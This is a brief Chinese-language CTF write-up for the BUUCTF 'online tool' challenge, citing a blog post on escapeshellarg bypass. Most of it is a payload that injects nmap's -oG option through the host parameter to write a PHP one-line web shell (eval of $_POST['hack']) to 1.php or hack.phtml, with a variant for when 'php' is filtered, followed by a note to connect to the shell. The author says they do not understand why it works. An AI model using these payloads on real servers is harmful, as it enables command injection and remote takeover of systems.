参考:http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/

例题:buuctf online tool



没看懂为什么,但反正如下构造就行:

```
?host=' <?php @eval($_POST["hack"]);?> -oG 1.php ' 
127.0.0.1 | ' <?= @eval($_POST["hack"]);?> -oG hack.phtml'//这是屏蔽了php关键字的情况
//写入一句话到1.php文件中,注意空格不能省略
```

然后再连接shell